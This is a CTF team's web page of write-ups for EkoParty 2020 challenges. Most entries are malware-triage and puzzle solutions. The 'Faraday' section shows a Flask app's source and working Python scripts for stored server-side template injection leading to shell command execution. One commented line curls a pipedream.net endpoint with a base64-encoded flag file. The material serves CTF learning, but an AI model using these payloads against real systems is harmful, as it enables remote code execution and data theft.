@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Londrina+Solid:wght@900|IBM+Plex+Sans:ital,wght@0,500;0,700;1,500;1,700|Rowdies&display=swap" rel="stylesheet">
+
+    <link
+        rel="stylesheet"
+        href="https://unpkg.com/simplebar@latest/dist/simplebar.css"
+    />
+    <script src="https://unpkg.com/simplebar@latest/dist/simplebar.min.js"></script>
+    <script
+        src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+        integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs="
+        crossorigin="anonymous"></script>
+        
+    <link rel="stylesheet" href="/base.css">
+    <link rel="stylesheet" href="/native.css">
+    
+    <title>(mendung)10^6</title>
+</head>
+<body>
+    <div class="header-content">
+        <center>
+            <div class="team-name">
+                <span>(mendung)10^6 === Mega Mendung</span>
+            </div>
+        </center>
+        <div class="menu-container">
+            <a href="/aboutus.html">
+                <div class="menu-button">
+                    <span class="text-menu aboutus">ABOUT US</span>
+                </div>
+            </a>
+            <a href="/notes.html">
+                <div class="menu-button">
+                    <span class="text-menu notes">NOTES</span>
+                </div>
+            </a>
+            <a href="/writeup.html">
+                <div class="menu-button">
+                    <span class="text-menu writeup">WRITEUP</span>
+                </div>
+            </a>
+            <a href="/news.html">
+                <div class="menu-button">
+                    <span class="text-menu news">NEWS</span>
+                </div>
+            </a>
+            <a href="/contact.html">
+                <div class="menu-button">
+                    <span class="text-menu contact">CONTACT</span>
+                </div>
+            </a>
+        </div>
+    </div>
+    <div class="main-content text-normal" data-simplebar>
+        <div  class="blog-content">
+    <h1>Exe</h1>
+<blockquote>
+<p>A common hash function used to identify malware is SHA256, may you please tell us what is the value of the hash for this malware sample?  </p>
+</blockquote>
+<p>This challenge is pretty straight forward. just unzip the malware and use any tool you like, I use <a href="https://emn178.github.io/online-tools/sha256_checksum.html" target="_blank">this online tool</a>. <br/>
+flag : EKO{eba35b2cd54bad60825f70fb121e324d559e7d9923b3a3583bb27dfd7e988d0c}</p>
+<h1>ABCD</h1>
+<blockquote>
+<p>What's the name of this famous malware?  </p>
+</blockquote>
+<p>We need some sort of database to find the name of the virus, this online tool, <a href="https://www.virustotal.com/gui/" target="_blank">virustotal</a> for example, works just fine, we can see that a lot of antivirus actually recognize the malware, which is the flag. <br/>
+Flag : EKO{ryuk}</p>
+<h1>Run</h1>
+<blockquote>
+<p>There are some antivirus products that cannot detect the following malware samples, can you name one of them?  </p>
+</blockquote>
+<p>Using virustotal we can see that there are in fact some antivirus that can't detect this malware, just pick one of them. <br/>
+Flag : EKO{alibaba}  </p>
+<h1>Cert</h1>
+<blockquote>
+<p>A malicious technique used by bad actors is to sign binaries with stolen certificates, this malware sample is signed by a chinesse company, the answer is the name of this company.  </p>
+</blockquote>
+<p>Again using virus total, on the Detail section, we can see that the binary is actually signed by a company, I don't really remember the formatting because I made the writeup after the CTF ends, I think it also uses the <code>Co., LTD.</code>. <br/>
+Flag : EKO{Beijing Qihu Technology Co., Ltd.}  </p>
+<h1>Deep</h1>
+<blockquote>
+<p>What's the ssdeep value of this malware sample?  </p>
+</blockquote>
+<p>Using any tools that generate ssdeep value works, I use <a href="https://www.virustotal.com/gui/" target="_blank">virustotal</a>. <br/>
+Flag : EKO{1536:KCnGt1AnxGhRoE0JLEaolArglgidmpHACgaSz42tpAonFcP+i+9l:jG1hRoE0JLE8Qjg6aSk0LE+9l}  </p>
+<h1>Obaphx</h1>
+<blockquote>
+<p>Name a suspicious or malicious MITRE technique used by the following malware.   </p>
+</blockquote>
+<p>using virustotal we can see that the name of the malware is Nymeria and it's a trojan. after a little bit of googling I came across <a href="https://www.hybrid-analysis.com/sample/e26a4346b2d54653635cdfa35954369eabc8947b055b022a7e8e28b9bd692217" target="_blank">this article</a> and that includes the MITRE ATT&amp;Ck technique detection and we can just submit any of the technique marked as malicious or suspicious, I choose hooking. <br/>
+Flag : EKO{hooking}</p>
+<h1>C&amp;C1</h1>
+<blockquote>
+<p>this is a network capture of a generic trojan sample, may you please tell us the IP address of the C&amp;C?  </p>
+</blockquote>
+<p>When we open the pcap file given with wireshark, there is one suspicious IP address that sent an encrypted alert (around time 237) , which is actually the ip of the C&amp;C. <br/>
+Flag : EKO{54.204.19.83}</p>
+<h1>COVID19</h1>
+<blockquote>
+<p>This file was found on a COVID-19 related phishing campaign, may you find the secret inside the file?  </p>
+</blockquote>
+<p>Looking at the file we can see that there is a suspiciously long string, by decoding it we can see some virus looking code but most importantly, the flag at the end.  </p>
+<div class="codehilite"><pre><span></span><code><span class="n">cipher</span> <span class="o">=</span> <span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">"covid"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">") )"</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s2">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">cipher</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">break</span>
+<span class="nb">print</span> <span class="n">flag</span>
+</code></pre></div>
+<p>```
+$ python solve.py | grep EKO
+EKO{super_infected}set startshe = wscript.createobject("wscript.shell")</p>
+<pre><code>Flag : EKO{super_infected}
+
+# Discord  
+&gt; Oh oh! you will find the answer on our Discord channel!  
+
+just go to the discord server, on the channel `#ctf-main` we can see the flag at the end of the description.  
+Flag : EKO{flag-format}  
+
+# Final  
+fill the survey.  
+
+# Indie  
+&gt; Relax and chill with this new indie game, maybe you'll be able to get some flags?  
+
+I use [Cetus](https://github.com/Qwokka/Cetus) for this, it's basically a Cheat Engine for WebAssembly games. Just scan the value for the score and change it to one million, this solution is also used solve the challenge "Cheater", just by taking one more virus it will pop up the second part of the flag.  
+
+![indie](./indie.png)
+
+Flag one : EKO{w3lc0m3_to*3k0-p4nd3mik}  
+Flag two : EKO{AreYouACheater,ReverserOrGamer?}
+
+# Cheater  
+See "Indie"
+
+# Wet
+&gt; This message was printed and got wet on a lousy mexican rain. Help us recover the flag.
+
+We are given a png file that has a qrcode inside (but broken because of the rain :v)
+
+![wet](./wet.png)
+
+Then i use [https://make8bitart.com/](https://make8bitart.com/) to recover the whole flag by manually tweaking it based on what i see from the wet qrcode
+
+![barcode](./barcode.png)
+
+Then i use [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx) to decode the qrcode as its using aztec kind of qrcode and zxing has a wide-range of supported algorithm (including aztec)...
+
+Flag : EKO{tirate_un_flag}
+
+# Clop
+&gt; This is one of the most dangerous malware sample, researchers usually protect these samples with a common password, extract the file and you will find the answer inside the sample.
+
+We are given a zip file containing that malware sample, but indeed we have to crack the password first and as said in the description we can use common password, so i use rockyou.txt and i got the file containing flag
+
+```bash
+╭─f4r4w4y@blackrock ~/Documents/hacking/ctf/ekoparty2020 
+╰─$ strings clop | grep -i eko
+EKO{1nf3ct3d}
+</code></pre>
+<p>Flag : EKO{1nf3ct3d}</p>
+<h1>Faraday</h1>
+<blockquote>
+<p>Our DevOps deployed something on tight deadline, but it didnt go through QA</p>
+</blockquote>
+<p>I didnt manage to create the writeup when this challenge still alive :(, but at least someone did manage to put the source code online so here we go.</p>
+<p>There's a website containing some stuff inside, here is the step of the app :
+- We got to choose what kind of event that we're attending
+- We can input a subject, body, recipient</p>
+<p>After looking at the inspect element we see that there is <code>/dump</code> endpoint and we can see the source code of the site there :</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">Response</span>
+<span class="kn">from</span> <span class="nn">flask_mail</span> <span class="kn">import</span> <span class="n">Mail</span><span class="p">,</span> <span class="n">Message</span>
+
+<span class="kn">import</span> <span class="nn">sqlite3</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'una-cualquiera-fruta-fruta'</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'MAIL_SERVER'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'smtp.gmail.com'</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'MAIL_PORT'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">465</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'MAIL_USERNAME'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'faradaysec@gmail.com'</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'MAIL_PASSWORD'</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">'GMAIL_PASSWORD'</span><span class="p">]</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'MAIL_USE_TLS'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'MAIL_USE_SSL'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
+
+<span class="n">mail</span> <span class="o">=</span> <span class="n">Mail</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+<span class="n">DATABASE</span> <span class="o">=</span> <span class="s1">'/app/database.db'</span>
+
+<span class="n">acc_tmpl</span> <span class="o">=</span> <span class="s1">'''</span>
+<span class="s1">Se reporto un evento en SERVIDOR:</span>
+<span class="s1">{{ mensaje }}</span>
+<span class="s1">'''</span>
+
+<span class="k">def</span> <span class="nf">get_db</span><span class="p">():</span>
+    <span class="n">db</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">'_database'</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">db</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">db</span> <span class="o">=</span> <span class="n">g</span><span class="o">.</span><span class="n">_database</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">)</span>
+        <span class="n">db</span><span class="o">.</span><span class="n">isolation_level</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="c1">#db.row_factory = sqlite3.Row</span>
+        <span class="c1">#db.text_factory = lambda x: str(x).replace('"', '&amp;quot;').replace("'", '&amp;#x27;').replace('&lt;', '&lt;').replace('&gt;', '&gt;')</span>
+    <span class="k">return</span> <span class="n">db</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">teardown_appcontext</span>
+<span class="k">def</span> <span class="nf">close_connection</span><span class="p">(</span><span class="n">exception</span><span class="p">):</span>
+    <span class="n">db</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">'_database'</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">db</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">init_db</span><span class="p">():</span>
+    <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>
+        <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
+        <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">open_resource</span><span class="p">(</span><span class="s1">'schema.sql'</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+           <span class="n">db</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+        <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">query_db</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(),</span> <span class="n">one</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+    <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>
+        <span class="n">cur</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="p">[</span><span class="nb">dict</span><span class="p">((</span><span class="n">cur</span><span class="o">.</span><span class="n">description</span><span class="p">[</span><span class="n">idx</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span> \
+                <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">row</span><span class="p">))</span> <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">cur</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()]</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">rv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">rv</span> <span class="k">else</span> <span class="kc">None</span><span class="p">)</span> <span class="k">if</span> <span class="n">one</span> <span class="k">else</span> <span class="n">rv</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/sendMessage'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">sendMessage</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">:</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="n">Message</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'subject'</span><span class="p">],</span> <span class="n">sender</span> <span class="o">=</span> <span class="s1">'faradaysec@gmail.com'</span><span class="p">,</span> <span class="n">recipients</span> <span class="o">=</span> <span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'dest'</span><span class="p">]])</span>
+        <span class="n">msg</span><span class="o">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">acc_tmpl</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'SERVIDOR'</span><span class="p">,</span> <span class="n">query_db</span><span class="p">(</span><span class="s1">'SELECT nombre FROM usuarios ORDER BY usuario_id DESC'</span><span class="p">,</span> <span class="n">one</span><span class="o">=</span><span class="kc">True</span><span class="p">)[</span><span class="s1">'nombre'</span><span class="p">]),</span> <span class="n">mensaje</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'body'</span><span class="p">])</span>
+        <span class="n">mail</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'enviado.html'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'dest'</span><span class="p">])</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/profile'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">profile</span><span class="p">():</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">name</span><span class="p">:</span>
+        <span class="n">query_db</span><span class="p">(</span><span class="s1">'INSERT INTO usuarios (nombre) VALUES ("</span><span class="si">%s</span><span class="s1">")'</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'sender.html'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'error.html'</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'base.html'</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/error'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">error</span><span class="p">():</span>
+    <span class="mi">1</span><span class="o">/</span><span class="mi">0</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/dump'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">dump</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">'text/plain'</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></div>
+<p>There's a rabbit hole at <code>/error</code> (or so i thought) which will trigger an error and we know that debug mode is turned on, and that we can see the stack trace (but we cant do anything since we can't interact with it because the command console is locked with a pin)</p>
+<p>So i start the hard way, by reviewing the code itself (you know why its hard ? because of the language that i dont understand XD, i gotta jump back and forth to google translate)</p>
+<p>But after a while i noticed something good here (as the chall description said that this code didnt even pass the QA) so i know that we can reproduce the bug in this way :
+- Going to <code>/profile</code> and putting <code>name</code> argument using some arbitrary template injection payload, this will make our payload stored in the db (specifically in <code>nombre</code> column inside <code>usuarios</code> table)
+- Then when we make post request to <code>/sendMessage</code>, it will make a query of <code>query_db('SELECT nombre FROM usuarios ORDER BY usuario_id DESC', one=True)['nombre']</code> which means that it will take the one last inputted <code>nombre</code> in <code>usuarios</code> table and use it inside this code <code>msg.body = render_template_string(acc_tmpl.replace('SERVIDOR', thequery), mensaje=request.form['body'])</code></p>
+<p>But here's the thing to consider, in acc_tmpl there is already a template string : <code>{{ mensaje }}</code> which turned out to be anothe rabbit hole if you try to inject your payload here because there are two template render in the code, the first one using <code>render_template_string</code> and the second one is using <code>render_template</code>, so if we put our payload on the <code>mensaje</code>, it won't triggered since the first template render will render it as a string thus we can't do anything with it.</p>
+<p>But it doesn't stop there since we can still inject our payload using the <code>SERVIDOR</code> part from the first template render</p>
+<p>I tried my exploit code, it doesn't work and i was a little bit confused here at the time, but i notice that its such a bad challenge because our payload can actually be overriden by other people that try to exploit this chall too :( (because of the <code>insert and select from last</code> query)</p>
+<p>So i inject my payload 5 times and i listen by always creating post request to <code>/sendMessage</code></p>
+<p>I used a simple flask ssti payload that's using <code>subprocess.Popen</code></p>
+<p>The first exploit code (to inject the payload) :</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="c1"># ' \'\'.__class__.__mro__[1].__subclasses__()[401](\'curl "https://aeb145bc424a63e5152a44b9404cf984.m.pipedream.net?flag="+$(cat flag.txt | base64)\', shell=True, stdout=-1).communicate() '</span>
+    <span class="s1">' </span><span class="se">\'\'</span><span class="s1">.__class__.__mro__[1].__subclasses__()[401](</span><span class="se">\'</span><span class="s1">strings * | base64</span><span class="se">\'</span><span class="s1">, shell=True, stdout=-1).communicate() '</span>
+<span class="p">]</span>
+
+<span class="n">ssti</span> <span class="o">=</span> <span class="s1">'https://faradaychallenge.herokuapp.com/profile?name={{</span><span class="si">%s</span><span class="s1">}}'</span>
+
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">ssti</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</code></pre></div>
+<p>The second exploit code (to listen to the stored payload and see the result) :</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span> 
+
+<span class="n">sendMessage</span> <span class="o">=</span> <span class="s1">'https://faradaychallenge.herokuapp.com/sendMessage'</span>
+
+<span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">'</span><span class="si">{counter}</span><span class="s1">--------------------------------------------------------------------'</span><span class="p">)</span>
+    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'dest'</span><span class="p">:</span> <span class="s1">'pastaflora</span><span class="si">%40f</span><span class="s1">aradaysec.com'</span><span class="p">,</span>
+        <span class="s1">'subject'</span><span class="p">:</span> <span class="s1">'asd'</span><span class="p">,</span>
+        <span class="s1">'body'</span><span class="p">:</span> <span class="s1">'asd'</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">sendMessage</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">obj</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'&lt;pre&gt;'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'&lt;/pre&gt;'</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="k">except</span> <span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
+<p>Notice that im using <code>strings *</code> in the payload which turned out that i can see other people payload that stored in the db too :v</p>
+<p>FLAG : EKO{5d7f587b198f97aae048a40d9f46bc73}</p>
+
+</div>
+    </div>
+</body>
+<script>
+    $(".menu-button").hover(function(){
+        $(this).addClass("hovered");
+    }, function(){
+        $(this).removeClass("hovered");
+    });
+
+    window.setInterval(anim, 2500);
+
+    function anim() {
+        var menus = ["aboutus", "notes", "writeup", "contact", "news"]
+
+        lastPath = window.location.pathname.split("/").pop().split(".html")[0]
+        menus = menus.filter(item => item !== lastPath)
+
+        if (!hoveredExist()) {
+            menu = menus[Math.floor(Math.random() * menus.length)]
+            for (let i = 0; i < 5; i++) {
+                blink(i, menu)  
+            }
+        }
+    }
+
+    function blink(i, menu) { 
+        setTimeout(function() { 
+            $("." + menu)
+                .parent()
+                .addClass("hovered")
+            setTimeout(function () {
+                $("." + menu)
+                    .parent()
+                    .removeClass("hovered")
+            }, 50);
+        }, 100 * i); 
+    } 
+
+    function hoveredExist() {
+        var menus = ["aboutus", "notes", "writeup", "contact", "news"]
+        for (let index = 0; index < menus.length; index++) {
+            const menu = menus[index];
+            if ($("." + menu)
+                    .parent()
+                    .hasClass("hovered")) {
+                return true
+            }   
+        }
+        return false
+    }
+</script>
+</html>
